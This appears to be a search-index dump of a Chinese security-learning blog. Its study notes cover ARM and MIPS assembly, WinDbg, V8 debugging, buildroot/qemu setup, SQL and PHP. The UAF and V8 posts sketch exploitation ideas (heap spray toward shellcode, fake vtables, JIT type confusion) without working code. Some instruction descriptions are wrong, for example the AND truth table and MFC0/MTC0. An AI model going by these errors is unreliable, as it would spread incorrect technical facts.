1149.1标准的另一种国际标准测试协议。用于芯片级和系统级的测试。，包含5个引脚：TDI、TDO、TMS、TCK、TRST.可以接到芯片的tap（测试访问口）\n## IoT无线通信简介\n最常用协议：Wi-Fi(802.11)、ZigBee(802.15.4)、Z-Ware、蓝牙(802.15.1)、低功耗蓝牙。\n# IoT威胁建模\n","categories":[],"tags":["IOT 《物联网渗透测试》"]},{"title":"《ARM 嵌入式 Linux 系统开发详解》学习笔记 1","url":"/posts/64036/","content":"# 0x01 嵌入式系统入门\n<b>什么是嵌入式系统：</b>\n\n一种为特定设备服务的，软件硬件可裁剪的计算机系统，形式变化多样、体积小。如手机、微波炉，对于手机、微波炉来说，需要小型计算机来控制，换句话，是需要把计算机全入到手机和微波炉里，也就是嵌入式系统，不需要严格地响应时间和数据吞吐量，最关键的是能够缩小体积以及功能专门化，嵌入式系统种类繁多，按照系统硬件的核心处理器来说可以分成嵌入式微控制器和嵌入式微处理器。\n\n<b>嵌入式微控制器：</b>\n\n嵌入式微控制器也就是传统意义上的单片机，是目前嵌入式系统的前身。单片机就是把一个计算机的主要功能集成到一个芯片上，即一个芯片就是一个计算机，体积小、结构简单、便于开发以及价格经济。\n\n通常一个单片机芯片包含运算处理单元、ARM、Flash存储器以及外部接口，通过外部接口可以输出或者输入心寒，控制相应的设备，用户可以把编写好的代码烧写到单片机芯片内部来控制外部设备。\n\n<b>嵌入式微处理器：</b>\n\n单片机处理能力低，嵌入式微处理器是最近几年随着大规模集成电路发展同步，处理能力更强，目前主流嵌入式微处理器都是32位，而单片机多是8位和16位。\n\n<b>典型嵌入式系统组成：</b>\n\n嵌入式系统与传统PC一样，也是一种及计算机系统，由硬件和软件组成，硬件包括嵌入式微控制器和微处理器，以及一些外围元器件和外部设备；软件包括嵌入式操作系统和应用软件。\n\n嵌入式系统种类繁多，不同的嵌入式系统软、硬件很难兼容，软件必须修改而硬件必须重新设计才能使用。\n\n典型嵌入式系统:\n\n* 硬件：\n\t* 嵌入式处理器：处理器是整个系统的核心，负责处理所有的软件程序以及外部设备的信号\n\t* 外部设备：在不同系统中有不同选择。\n* 软件：\n\t* 嵌入式操作系统：是软硬件的接口，负责管理系统的所有软件和硬件资源，还可以通过驱动程序与外部设备打交道。\n\t* 应用软件：利用操作系统提供的功能开发出针对某个需求的程序，供用户使用。\n\n# 0x02 嵌入式软硬件系统\n数字电路是计算机的基础。\n\n进制转换\n\n计算机组成原理\n\n\n直接内存访问：DMA\n\n\n软件：系统软件、应用软件\n\n软件开发：需求分析、概要设计和详细设计、编码和调试、测试和维护。\n\n常见软件开发模型：瀑布开发模型、增量开发模型、统一软件开发模型。\n\n\n操作系统的基本结构都是内核、驱动程序、程序库。\n# 0x03 ARM处理器\n\n* 微处理器\n\t* 通用微处理器：用于高性能计算\n\t* 嵌入式微处理器：针对某种特定应用的高能力计算\n\t* 微控制器：用于控制某种设备，通常集成了多种外部设备控制器，处理指令能力不强但价格低廉。\n\nARM:高性能RISC机器。\n\n* 芯片体积小，功耗低，成本低性能优异\n* 支持Thumb(16位)和ARM(32位)\n* 内部大量使用寄存器，执行指令速度快。\n* 大部分指令是操作寄存器，很少访问外部内存\n* 采用多级流水线结构处理速度快。\n* 多种寻址方式，数据存取方式灵活\n* 指令长度固定，便于编译器操作以及执行指令\n\n### ARM指令集\n* 算术运算指令\n\t* ADD:加法运算\n\t\t* add dest,op1,op2 //dest是目的寄存器，op1 op2是操作数,dest=op1+op2\n\t* ADC:带进位加法\n\t\t* ADC dest,op1,op2\n\t* SUB:减法\n\t\t* sub dest,op1,op2\n\t\t* dest=op1-op2\n\t* SBC：带进位减法\n* 逻辑运算指令\n\t* AND:逻辑与(1 1为1，0 0为1，1 0为0)\n\t\t* and dest,op1,op2\n\t\t* dest=op1 and op2\n\t* EOR:异或（1 1为0，0 0为0，10为1）\n\t* MOV:复制数据\n\t\t* mov dest,op1\n\t\t* dest=op1\n\t\t* mov r0,r0,LSL#3//r0=r0*8,LSL寄存器左移三位，即乘以8\n* 分支指令\n\t* B:跳转\n\t\t* b 地址 //跳转到指定地址\n* 数据传送指令\n\t* 单一数据传送指令：向内存装载和存储一个字节或一个字长的数据\n\t\t* LDR Rd,地址\n\t\t* STR Rd,地址\n\t\t* LDR B Rd,地址\n\t\t* STR B Rd,地址 \n\t* 多数据传送指令：向内存装载和存储多个字节或字的数据\n\t\t* xxM Rn(!),<寄存器列表>{^}\n\t\t* xx:LD--装载，ST--存储\n\t\t* LDMED LDMIB//++i\n\t\t* LDMFD LDMIA//i++\n\t\t* LDMEA LDMDB//++*i\n\t\t* LDMFA LDMDA//*i++\n\t\t* STMFA STMIB//存储前增加地址\n\t\t* STMEA STMIA//存储后增加地址\n\t\t* STMFD STMDB//存储前增加值\n\t\t* STMED STMDA//存储后增加值\n\nARM状态：0位表示ARM状态，1位表示Thumb状态,BX指令切换状态。\n\nMMU:内存管理单元。\n> LSL:逻辑左移，二进制从右往左移动，空位补0（就是原数值乘以2的移位次方）\n> LSR:逻辑右移，二进制从左往右，空位补0\n> ASR:算术右移，符号位不变，高位空出补0，低位补1\n> ROR:循环右移，低位移到高位\n> RRX:带扩展的循环右移：操作数右移一位，高端空出位用原C标志值填充\n\n### 寻址方式\n* 立即寻址:用#表示数值\n\t* subs r0,#1;r0=r0-1\n\t* mov r0,#0xff00;r0=0xff00\n* 寄存器寻址方式：读取寄存器得到操作数\n\t* mov r1,r2;r1=r2\n\t* sub r0,r1,r2;r0=r1-r2\n* 寄存器偏移寻址：寄存器的值移位得结果\n\t* mov r0,r1,LSL #3;r0=r1*8\n\t* ands r0,r2,LSL #3;r0= r2*8 and r1\n* 寄存器间接寻址：寄存器为地址，从对应内存重取出数据\n\t* LDR r0,[r1];r1为地址，从内存中取出数据存入r0\n\t* SWP r0,r0,[r1];r1为地址，从内存中取出数据与r0交换\n* 基址寻址：把寄存器内容与指定便宜相加，得数据地址，后从内存中取出数据\n\t* LDR r0,[r1,#0xf];r1数值与0xf相加得到数据地址\n\t* STR r0,[r1,#-2];r1数值-2得到数据地址\n* 多寄存器寻址：一次传输多个寄存器值\n\t* LDMIA r1!,{r2~r7,r12};r1单元重数据读到r2~r7和r12,r1指定地址自动加1\n* 栈寻址：先进后出，通过栈指针寄存器寻址\n\t* STMFD SP!,{R0~R7,LR};r0~r7和LR的内容压入堆栈\n\t* LDMFD SP!,{r0~r7,LR};从堆栈中取出数据到r0~r7和LR\n\n# 0x04 嵌入式Linux\n\n一般来说，嵌入式操作系统是由启动程序、核心、根文件系统组成，通过特殊的烧录工具将编译好的嵌入式系统文件影像烧写到目标板的只读存储器（ROM）或Flash存储器中。\n# 0x05 建立软件开发环境\n* 运行在windows平台下得到Linux系统模拟环境：Cygwin.\n* linux下：串口工具minicom\n* windows下：串口工具xshell\n* ARM集成开发环境ADS\n\t* c语言编译器armcc\n\t* c++语言编译器armcpp\n\n# 0x06 第一个linux应用程序\n* vi创建源代码文件hello.c\n* gcc -c hello.c 编译运行\n# 0x07 Linux应用程序编程基础\n* 堆栈\n* 内存管理函数\n\t* malloc():分配内存，不能初始化内存空间\n\t* free()：释放malloc()分配的内存\n* 实用的内存分配函数\n\t* calloc():分配一块新内存，向应用程序分诶内存，分配后会初始化新分配的内存空间\n\t* realloc():改变一块已经分配的内存大小，函数调整后的内存空间起始地址有可能与原来的不同，所以需要realloc()函数的返回值。\n* 文件指针和流：FILE*fp\n* getc() /fgetc() /getchar()\n* POSIX文件I/O编程\n\t* POSIX可移植操作系统接口\n\t* open() /creat() /close() /read() /write() /fcnt()修改一打开文件属性\n\t* 文件头：\n\t\t* <sys/types.h>\n\t\t* <sys/stat.h>\n\t\t* <fcntl.h>\n# 0x08 开发多进程/线程程序\n* PCB进程控制块\n* fork()调用创建进程\n* 退出进程：exit()、_exit()、atexit()、on_exit().\n* 常用进程间通信方法：\n\t* 管道：单方向传送数据，只能在有共同父进程的进程间使用\n\t\t* pipe()函数：创建管道\n\t\t* #include<unistd.h> int pipe(int filedes[1]);\n\t* 共享内存：不同进程可访问\n\t\t* int shmget():创建\n\t\t* void *shmat：获得一个共享内存ID对应的内存其实地址\n\t\t* int shmdt：从程序中分立一块共享内存\n\t* FIFO\n\t* 消息队列\n\t* 信号量\n\t* 共享存储\n\t* socker\n* Linux的多进程和多线程\n\n# 0x09 网络通信应用\n* TCP/IP协议簇\n\n![捕获.PNG](https://i.loli.net/2020/09/07/REugKvzkfIn7B58.png)\n\n* IP协议：在传输层，负责数据包的传输管理\n\t* 实现两个功能：寻址和分段","categories":[],"tags":["学习笔记"]},{"title":"RPC 入侵：MS06-040 与 MS08-067","url":"/posts/59247/","content":"# RPC漏洞\nRPC即Remote Procedure Call,是分布式计算中的技术，属于进程间的通信，RPC就是在自己的程序中调用一个函数，这个函数是在另外一个或多个远程机器上执行，执行完后将结果传回主机进行后续操作，如果远程调用的函数出现了问题，甚至有可以被利用的安全漏洞，这就是RPC漏洞。\n\n","categories":[],"tags":["《0 Day安全》"]},{"title":"WinDbg 使用整理","url":"/posts/46552/","content":"## 0x00 基础命令\n* .sympath　　//显示设置的符号表路径\n* .reload　　　　//此命令主要用于加载符号表。\n* .reload /f　　//重新装载模块\n* .reload /i　　//强制加载mismatched symbol\n* U　　//这个命令主要用于反汇编某个地址，其后面可以跟函数名和地址。U命令后面可以加L表示延长反汇编长度\n* db　　//显示一字节的长度。\n* dw　　//显示两字节的长度。\n* dd　　//显示四字节的长度。\n* dq　　//显示八字节的长度。\n* dD　　//显示double实数(8字节的长度)。\n* df　　//显示float实数(4字节的长度)。\n* da     //显示asscii值\n* du     //显示unicode值\n* ds     //显示ANI_STRING值\n* dS     //显示UNICODE_STRING的值\n* eb address value　　//在address 这个地址写入一个字节value\n* ew address value　　//在address 这个地址写入两字节value\n* ed address value　　//在address 这个地址写入四字节字节value\n* eq address value　　//在address 这个地址写入八字节字节value\n\n## 0x01 对象相关命令\n* dt　　//dt命令主要用于查看结构体。\n* lm　　//列出模块。\n* lm vm 模块名　　//查看模块详细信息。 \n* !process 0 0 　　　　//列出系统进程信息\n* !process 0 0 进程名  //列出该进程的信息\n* !process 0 1 进程名  //列出该进程更加的信息\n* !process 0 7 进程名  //列出该进程的详细信息，包括线程的\n* .process EPROCESS　　//切入该进程中\n* !object 地址　　//显示该地址的对象信息。\n* bp address  //在地址address插入断点。\n* ba命令是是硬件断点命令，通过设置cpu的dx寄存器来拦截线程。\n* ba access size 地址　　//access 是访问的方式，比如 e (执行)，r (读/写)，w (写) ，size是监控访问的位置 的大小，以字节为单位。值 为 1、2或4，在64位机器上还可以是8。\n* bd/be/bc\n* bd 断点号 //此命令是关闭断点号所对应的断点 。\n* be 断点号 //此命令是开启断点号所对应的断点 。\n* bc *　　　//去除所有断点。\n* x   //x命令用来模糊查询\n* x nt!kes*des*table*   //样查看SSDT表的地址\n* dds 地址 //此命令用来解析某连续地址的函数名。","categories":[],"tags":["学习笔记"]},{"title":"V8 漏洞初学习","url":"/posts/14155/","content":"\n# V8基础\nv8是chrome浏览器的js解析引擎，大多数针对chrome的漏洞利用几乎都是v8引擎引起的\n> v8编译后二进制名称叫d8.\n\n## allow-natives-syntax选项\n定义了一些v8运行时支持函数，以便于本地调试：\n\n```\nbrowser/x64.release$ ./d8 --allow-natives-syntax\nV8 version 7.5.0 (candidate)\nd8> var a = [1, 2, 3];\nundefined\nd8> %DebugPrint(a);\n0x2ebcfb54dd41 <JSArray[3]>\n[1, 2, 3]\nd8> %SystemBreak();\nTrace/breakpoint trap (core dumped)\n```\n\n在加载d8时加入此选项可以在js中调试本地运行时函数：\n\n`%DebugPrint(obj) 输出对象地址`\n`%SystemBreak() 触发调试中断主要结合gdb等调试器使用`\n\ngdb的gdbinit脚本可以使gdb中就能可视化显示v8的对象结构，将该脚本下载重命名为gdbinit_v8并添加至/.gdbinit脚本：\n\n`source /path/to/gdbinit_v8`\n\n下面将allow-natives-syntax选项和gdbinit结合使用，编写test.js：\n\n```\nvar a = [1,2,3];\nvar b = [1.1, 2.2, 3.3];\nvar c = [a, b];\n%DebugPrint(a);\n%SystemBreak();  //触发第一次调试\n%DebugPrint(b);\n%SystemBreak();  //触发第二次调试\n%DebugPrint(c);\n%SystemBreak();  //触发第三次调试\n```\n\ngdb运行d8:\n```\nroot@kali:~/ctf/browser/x64.release$ gdb ./d8\npwndbg> set args --allow-natives-syntax ./test.js\npwndbg> r\nStarting program: x64.release/d8 --allow-natives-syntax ./test.js\n[Thread debugging using libthread_db enabled]\n[New Thread 0x7ff87fde9700 (LWP 18393)]\n[New Thread 0x7ff87f5e8700 (LWP 18394)]\n[New Thread 0x7ff87ede7700 (LWP 18395)]\n0x12e891f8df11 <JSArray[3]>            \n```\n\n可以发现，程序打印了数组对象a的内存地址，并且SystemBreak触发了gdb的中断。\n\n此时就可以利用上面已经加入的gdbinit脚本中包含的命令调试对象结构，主要使用job命令，可以可视化显示js对象的内存结构。\n\nv8在内存中只有数字和对象梁忠表示，为了区分两者，v8在所有对象的内存地址末尾都加了1，以便表示它是个对象。对象a世内存地址为0x12e891f8df10。\n\ntelescope命令查看内存数据。\n\n在gdb中使用c命令继续运行，发现停在了第二次SystemBreak的地方，然后用job命令查看第二个对象b的地址，根据上面的套路，可知对象b的实际内存地址为0x244de278df58.\n## v8的对象结构\n和vb等语言的解析类似，JS是一种解释之行语言，v8本质上是一个JS的解释执行程序。\n\n首先，需要了解v8解析执行javaScript语句的基本流程：v8在读取js语句后，首先将这条语句解析为语法树，然后通过解释器将语法树变为中间语言的Bytecode字节码，最后利用内部虚拟机将字节码转换为机器码来执行。\n\n为了加快解析过程，v8会记录下某条语法树的执行次数，当v8发现某条语法树执行次数超过一定阈值后，就会将这段语法树直接转换为机器码，后续再调用这条js语句时，v8会直接调用这条语法树对应的机器码，而不用再转换为byte code字节码，大大加快了执行速度，这就是著名的JIT优化。\n\n但是这样的性能优化虽然加快了程序的执行，但也带来了很多的安全问题，如果v8本来通过JIT引擎为某段语法树比如a+b假发计算生成了一段机器码`add eax,ebx`，而在后续某个时刻，攻击者在js引擎中突然改变了a和b的对象类型，而JIT引擎并没有识别出这个改变，就会造成a和b对象在假发运算时的类型混淆。\n\n一个对象在内存中布局大致如下：\n\n* map:表明了一个对象的类型对象b为PACKED_DOUBLE_ELEMENTS类型\n* prototype：prototype\n* elements:对象元素\n* length:元素个数\n* properties:属性\n\n数组对象的elements其实也是个对象，这些元素在内存中的分布正好位于数组对象的上方，即低地址处，也就是说，在内存申请上，v8先申请了一块内存存储元素内容，然后申请了一块内存存储这个数组的对象结构，对象中的elements指向了存储元素内容的内存地址，如图：\n\n\n![1.PNG](https://i.loli.net/2020/07/17/JCK5EwuRAc8SQTn.png)\n\n由于浏览器的漏洞利用几乎都要基于对象结构来实现，因此熟悉上述v8对象的内存布局，对后续会很有帮助。\n\n> 上述内存布局是FloatArray的内存布局，其他类型的Array与其类似，但不完全相同。\n\n## 浏览器V8的解题步骤\n一般浏览器的出题有两种，以中山市diff修改v8引擎源代码，人为制造出一个漏洞，另一种是直接采用某个cve漏洞。出题者通常会提供一个idf文件，或直接给出一个编译后diff补丁后的浏览器程序，如果只给了一个diff文件，则需要我们自己去下载相关commit源码，然后本地打上diff补丁，编译出浏览器程序在进行本地调试。\n## 参考\nhttps://www.codercto.com/a/81538.html\n\n后续需要实践做一下这个ctf题目。\n","categories":[],"tags":["chrome_bug"]},{"title":"Ubuntu 下 buildroot 以及 qemu 环境搭建","url":"/posts/2371/","content":"# 0x00 搭建环境\nwindows 10\nVMwareWorkstation pro\nUbuntu 16.04 x64\n# 0x01 安装binwalk\n```\nsudo su\nsudo apt-get remove binwalk\nsudo spt-get update\nsudo apt-get install build-essential autoconf git //获取Git\ngit clone https://github.com/devttys0/binwalk\ncd binwalk\nsudo python setup.py install\nsudo ./deps.sh\n```\n\n# 0x02 安装buildroot交叉编译环境\n安装依赖：\n\n`sudo apt-get install libncurses5-dev patch`\n\n下载buildroot:\n\n`wget https://buildroot.org/downloads/buildroot-2020.02.6.tar.gz\n`\n\n```\ntar -zxvf buildroot-2020.02.6.tar.gz\ncd buildroot-2020.02.6\nmake clean\nmake menuconfig\n```\n\n出现配置界面：\n\n* 选择target options->target Architecture->MIPS(Little endian),代表MIPS小端序\n* 在toolChain-->Kelnel Headers,选择自己主机内核版本或更低版本。\n* 保存退出\n\n`sudo make`\n\n静等完成。\n\nos：编译的时候需要大内存，我分配个虚拟机的内存太小，导致编译失败了好几次……此处多谢Prowes5帮我找到了原因呜呜呜。\n\n测试：\n\n```\n./mipsel-linux-gcc hello.c -o hello\n./hello //失败\n```\n\n使用file查看，是小端序的mips程序。\n# 0x03 qemu运行环境\n```\nsudo apt-get install qemu\nsudo apt-get install qemu-user-static\n```\n\n测试hello报错`/lib/ld-uClibc.so.0: No such file or directory`\n\n是因为没有对应架构的链接库的问题\n在目录output/host/mipsel-buildroot-linux-uclibc/sysroot/lib/下，\n\n```\nsudo cp ld-uClibc-1.0.32.so /lib/\nsudo chown -R root:root /lib/ld-uClibc-1.0.31.so\nsudo ln -s /lib/ld-uClibc-1.0.32.so /lib/ld-uClibc.so.0\n```\n\n还是不行，cd /lib目录下，删掉了原来的ld-uClibc.so.0文件，然后重新输入命令。\n\n出现新报错：`/home/test/buildroot-2019.02.4/hello: can't load library 'libc.so.0'`\n\n解决方案：\n```\nsudo cp libuClibc-1.0.31.so /lib/\nsudo chown -R root:root /lib/libuClibc-1.0.32.so\nsudo ln -s /lib/libuClibc-1.0.32.so /lib/libc.so.0\n```\n\n还是出现了文件不对应问题，cd /lib下删掉了原来的libc.so.0文件，继续重新输入命令。\n\n运行成功。\n\nos:为了找到出错点，我真是已经切换目录切换到全都背下来了……真的是一搭环境总会碰到所有的问题……霉霉本霉了。\n\n# 0x04 配置网络环境\n\n","categories":[],"tags":["IOT"]},{"title":"UAF 漏洞简单学习","url":"/posts/24311/","content":"\nUAF漏洞是一种内存破坏漏洞，通常存在于浏览器中。\n\n## 产生原因\n\nuaf漏洞成因：一块堆内存被释放之后又被使用。\n再一次被使用是指：指针存在（悬垂指针被引用）引用结果不可预测。\n\n由于大多数堆内存都是C++对象，所以利用的核心思路即：分配堆去占坑，占的坑中又自己构造的虚表。\n\n## 分析方式\n\n分析uaf漏洞的要点在于弄清楚对象是在哪里被分配，被释放，被重用。\n\nuaf异常触发点：对已释放的对象进行操作导致的异常，所以异常点即重用点。\n\n而由于是对对象的操作，可以列出这个对象的所有方法，找出分配和释放的方法，对其下断来分析uaf过程。\n\n> 1.悬垂指针：指一类不指向任何合法的或者有效的（即与指针的含义不符）的对象的指针，比如一个对象的指针，如果这个对象已经被释放或者回收，但是指针没有进行任何的修改，仍然执行已被释放的内存，这个指针就叫做悬垂指针。\n> \n> 2.UAF漏洞：Use-AFTER-Free是一种内存破坏漏洞，简单来说，漏洞的原因是使用了悬垂指针。\n\n\n常见与UAF漏洞配合使用的是堆喷射，分配大量内存，增大靶子的面积，使eip跳进分配的内存中，而分配的内存中又充满了滑板指令，只要命中了滑板指令就可以命中shellcode\n\n## 调试方式\n\n对于uaf漏洞，调试器捕获到的异常并不是漏洞发生的第一现场，所以一般要使用gflags开启PageHeap和UST（windbg自带gflags工具）\n\n`gflags.exe /i 程序名.exe +hpa +ust`\n\n这样调试器会定位到最先出错的位置。\n\n> 技巧：\n> 1.在ida中查找函数后，在windbg下断\n> 2.打开poc文件后出现crash就是对象被重用，根据crash地址来找到重用的对象起始地址\n> 3.对对象起始使用 `!heap -p -a 地址` 可获得这个对象的分配信息，由回溯还可以知道是什么函数分配的。\n> 4.对分配函数下断到达分配现场\n> 5.在回溯中，分配函数一般为RtlAllocateHeap的上层，而释放函数一般就是FreeHeap的上层。","categories":[],"tags":["chrome"]},{"title":"SQL 学习与整理","url":"/posts/11594/","content":"## 0x01 SQL简介\nSQL（结构化查询语言）用于访问和操作数据库中的数据的标准数据库编程语言。\n\nSQL是关系数据库系统的标准语言，是一种ANSI标准的计算机语言。\n\n要创建一个显示数据库中的数据的网站，需要：\n\n* 一个RDBMS数据库程序（MS Access SQL Server MySQL）\n* 使用服务器端脚本语言（PHP ASP）\n* 使用SQL来获取所需的数据\n* 使用HTML/CSS来设置页面的样式\n\n## 0x02 SQL RDBMS概念\nRDBMS是关系数据库管理系统的缩写，是SQL的基础。\n\n### 什么是表\nRDBMS中的数据存储在成为表的数据库对象中，这个表基本上是一个相关数据条目的集合，由许多列和行组成，表是关系数据库中最常见和最简单的数据存储形式。\n### 什么是字段\n每个表都被分解成更小的实体，成为字段，Customers表中的字段由ID、姓名、年龄、地址和薪资组成。\n\n字段是表中的列，用于维护有关表中每条记录的特定信息。\n### 什么是记录或者行数据\n记录也成为数据行，即表中存在的每个单独的条目。\n\n记录是表中的水平实体。\n### 什么是列？\n列是表彰的垂直实体，其中包含与表中特定字段关联的所有信息。\n### 什么是空值\n表中的空值是显示为空的字段中的值，这意味中具有空值的字段是没有值的字段。\n### SQL约束\n约束是在表上的数据列上强制执行的规则，用于限制可以进入表中的数据类型，这确保了数据库中数据的准确性和可靠性。\n约束可以是列级别，也可以是表级别，列级约束仅应用于一列，而表级约束则应用于整个表。\n* NOT NULL约束：保列中数据不能有NULL值。\n* DEFAULT约束：提供该列数据未指定时所采用的默认值。\n* UNIQUE约束：保证列中的所有数据各不相同。\n* 主键约束：唯一标识数据表中的行/记录\n* 外键约束：唯一标识其他表中的一条行/记录\n* CHECK约束：此约束保证列中的所有值满足某一条件\n* 索引：用于在数据库中快速创建或检索数据\n\n约束可以在创建表时规定（通过CREATE TABLE语句）或者在表创建减值后规定（通过ALTER TABLE语句）。\n### 数据完整性\n每个关系数据库管理系统都存在以下类型的数据完整性：\n\n* 实体完整性-表中无重复行\n* 域完整性-通过限制值的类型，格式或范围来强制执行给定列的有效条目\n* 引用完整性-不能删除其他记录使用的行。\n* 用户定义的完整性-强制执行一些不属于实体、域或引用完整性的特定业务规则。\n\n\n### 数据库规范化\n数据库规范化是在数据库中有效的组织数据的过程，这个规范化过程有两个原因：\n\n* 消除多余数据\n* 确保数据依赖关系是有意义的\n\n规范化指导原则称为范式，范式的目的是组织数据库结构，使其符合第一范式、第二范式和第三范式的规则。\n## 0x03 SQL语法\n### SQL语法规则\n* SQL语句总是以关键字开始，如SELECT、INSERT、UPDATE、DELETE、DROP、CREATE.\n* SQL语句以分号结尾\n* SQL不区分大小写。\n\n### 数据库表\n数据库通常包含一个或多个表，每个表都用一个名称标识，该表包含带有数据的记录。\n### SQL语句\n`SELECT * FROM Customers;`\n### 一些重要的SQL命令\n* SELECT：从数据库中提取数据\n* UPDATE：更新数据库中的数据\n* DALETE：从数据库中删除数据\n* INSERT INTO：向数据库中插入新数据\n* CREATE DATABASE：创建新数据库\n* ALTER DATABASE:修改数据库\n* CREATE TABLE：创建数据库\n* ALTER TABLE:变更数据库表\n* DROP TABLE:删除表\n* CREATE INDEX：创建索引\n* DROP INDEX：删除索引\n\n\n* SELECT:`SELECT column_name(s) FROM table_name`\n* SELECT语句和WHERE子句：`SELECT [*] FROM [TableName] WHERE [condition]`\n* SELECT语句和WHERE和/或子句：`SELECT [*] FROM [TableName] WHERE [condition1] [AND [or]] [condition2]...`\n* SELECT语句与ORDER BY:\n\t* `SELECT column_name()`\n\t* `FROM table_name`\n\t* `ORDER BY column_name() ASC or DESC`\n* SELECT DISTINCT（区分）子句：\n\t* `SELECT DISTINCT column1,...columnN`\n\t* `FROM table_name;`\n* SELECT IN子句：\n\t* `SELECT column1,column2...columnN`\n\t* `FROM table_name`\n\t* `WHERE column_name IN (val-1,val-2,...val-N);`\n* SELECT LIKE(类)子句：\n\t* `SELECT column1,column2...columnN`\n\t* `FROM table_name`\n\t* `WHERE column_name LIKE {PATTERN};`\n* SELECT COUNT（计数）子句：\n\t* `SELECT COUNT(column_name)`\n\t* `FROM table_name`\n\t* `WHERE CONDITION;`\n* SELECT与HAVING子句：\n\t* `SELECT SUM(column_name)`\n\t* `FROM table_name`\n\t* `WHERE CONDITION`\n\t* `GROUP BY column_name`\n\t* `HAVING (arithematic function condition);`\n* INSERT INTO语句：\n\t* `INSERT INTO table_name(column1,column2,column3,...)`\n\t* `VALUES (value,value1,value2,value3...)`\n* UPDATE语句：\n\t* `UPDATE table_name`\n\t* `SET column=value,column1=value1`\n\t* `WHERE someColumn=someValue`\n* DELETE语句：\n\t* `DELETE FROM tableName`\n\t* `WHERE someColumn=someValue`\n* CREATE语句：\n\t* `CREATE TABLE table_name(column1  datatype,column2 datatype,column3 datatype,...columnN datatype,PRIMARY KEY(one or moe columns ));`\n* DROP语句：\n\t* `DROP TABLE table_name;`\n* DROP INDEX语句：\n\t* `AL TER TABLE table_name`\n\t* `DROP INDEX index_name;`\n* DESC语句：\n\t* `DESC table_name;`\n* TRUNCATE截断表语句：\n\t* `TRUNCATE TABLE table_name;`\n* ALTER TABLE语句：\n\t* `ALTER TABLE table_name{ADD|DROP|MODIFY} column_name {data_type};`\n* ALTER TABLE(对表名重命名)\n\t* `ALTER TABLE table_name RENAME TO new_table_name;`\n* USE语句：\n\t* `USE database_name;`\n* COMMIT语句：\n\t* `COMMIT;`\n* ROLLBACK语句：\n\t* `ROLLBACK;`\n## 0x04 SQL选择\n\n","categories":[],"tags":["学习记录"]},{"title":"PHP 学习笔记","url":"/posts/59983/","content":"## Hello World\n```\n<?php\necho \"Hello World!\";\n?>\n```\n\n## 变量\n以$符号开始，后跟着变量名称，名称以字母或下划线开始，只能包含字母数字下划线，区分大小写。\n* ","categories":[],"tags":["学习笔记"]},{"title":"MIPS 架构学习笔记","url":"/posts/23648/","content":"# 0x01 寄存器\n### 32个通用寄存器：$0-$31,32位\n\nMIPS32中通用寄存器的约定用法：\n\n|:--:|:--:|\n|寄存器名字|约定名字|用途|\n|$0|zero|总是为0|\n|$1|at|留作汇编器生成一些合成指令|\n|$2 $3|v0 v1|用来存放子程序返回值|\n|$4~$7|a0~a3|调用子程序时，使用这4个寄存器传输前4个非浮点参数|\n|$8~$15|t0~t7|临时寄存器，子程序使用时可以不用存储和恢复|\n|$16~$23|s0~s7|子程序寄存器变量，改变这些寄存器值的子程序必须存储旧的值并在退出前恢复，对调用程序来说值不变|\n|$24 $25|t8 t9|临时寄存器，子程序使用时可以不用存储和恢复|\n|$26 $27|$k0 $k1|由异常处理程序使用|\n|$28或$gp|gp|全局指针|\n|$29或$sp|sp|堆栈指针|\n|$30或$fp|s8/sp|子程序可以用来做堆栈帧指针|\n|$31|ra|存放子程序返回地址|\n\n### 特殊寄存器\n* PC:程序计数器\n* HI:乘除结果高位寄存器\n* LO:乘除结果低位寄存器\n\n<b>MIPS架构属于小端模式</b>\n\n### MIPS指令\n|:----:|:----:|\n|指令|功能|\n|LB|从存储器中读取一个字节的数据到寄存器中|\n|LH|从存储器中读取半个字的数据到寄存器中|\n|LW|从存储器中读取一个字的数据到寄存器中|\n|LD|从存储器中读取双字的数据到寄存器中|\n|L.S|从存储器中读取单精度浮点数到寄存器中|\n|L.D|从存储器中读取双精度浮点数到寄存器中|\n|LBU|=LB,无符号数据|\n|LHU|=LH,无符号数据|\n|LWU|=LW,无符号数据|\n|SB|把一个字节的数据从寄存器存储到存储器中|\n|SH|把半个字节的数据从寄存器存储到存储器中|\n|SW|把一个字的数据从寄存器存储到存储器中|\n|SD|把两个字节的数据从寄存器存储到存储器中|\n|S.S|把单精度浮点数从寄存器存储到存储器中|\n|S.D|把双精度数据从存储器存储到存储器中|\n|DADD|把两个定点寄存器的内容相加，即定点加|\n|DADDI|把一个寄存器的内容加上一个立即数|\n|DADDU|不带符号的加|\n|DADDIU|把一个寄存器的内容加上一个无符号的立即数|\n|ADD.S|把一个单精度浮点数加上一个双精度浮点数，结果是单精度浮点数|\n|ADD.D|把一个双精度浮点数加上一个单精度浮点数，结果是双精度浮点数|\n|ADD.PS|两个单精度浮点数相加，结果是单精度浮点数|\n|DSUB|两个寄存器的内容相减|\n|DSUBU|不带符号的减|\n|SUB.S|一个双精度浮点数减去一个单精度浮点数，结果是单精度浮点数|\n|SUB.D|一个双精度浮点数减去一个单精度浮点数，结果为双精度浮点数|\n|SUB.PS|两个单精度浮点数相减|\n|DDIV|两个顶点寄存器的内容相除|\n|DDIVU|不带符号的除法运算|\n|DIV.S|双精度浮点数除以单精度浮点数，结果为单精度浮点数|\n|DIV.D|双精度浮点数除以单精度浮点数，结果为双精度浮点数|\n|DIV.PS|两个单精度浮点数相除，结果为单精度|\n|DMUL|两个定点寄存器的内容相乘|\n|DMULU|无符号相乘|\n|MUL.S|双浮点乘单浮点得单浮点|\n|MUL.D|双浮点乘单浮点得双浮点|\n|MUL.PS|两个单浮点乘，得单浮点|\n|AND|与运算|\n|ANDI|一个寄存器中的内容与一个立即数相与|\n|OR|或运算|\n|ORI||\n|XOR|异或|\n|XORI||\n|BEQZ|条件转移指令，当寄存器中内容为0时转移发生|\n|BENZ|条件转移指令，寄存器内容不为0时转移发生|\n|BEQ|条件转移指令，两个寄存器内容相等是转移发生|\n|BNE|条件转移指令，两个寄存器中内容不等时转移发生|\n|J|直接跳转指令，跳转的地址在指令中|\n|JR|使用寄存器的跳转指令，跳转的地址在寄存器中|\n|JAL|直接跳转指令，带有链接功能，指令的跳转地址在指令中，跳转发生时要把返回地址存放到R31寄存器中|\n|JALR|使用寄存器的跳转指令，并且带有链接功能，指令的跳转地址在寄存器中，跳转发生时指令的放回地址放在R31|\n|MOV.S|把单浮点数从浮点寄存器复制到另一个浮点寄存器|\n|MOV.D|把一个双浮点数从一个浮点寄存器复制到另一个浮点寄存器|\n|MFC0|把一个数据从通用寄存器复制到特殊寄存器|\n|MTC0|把一个数据从特殊寄存器复制到通用寄存器|\n|MFC1|把一个数据从定点寄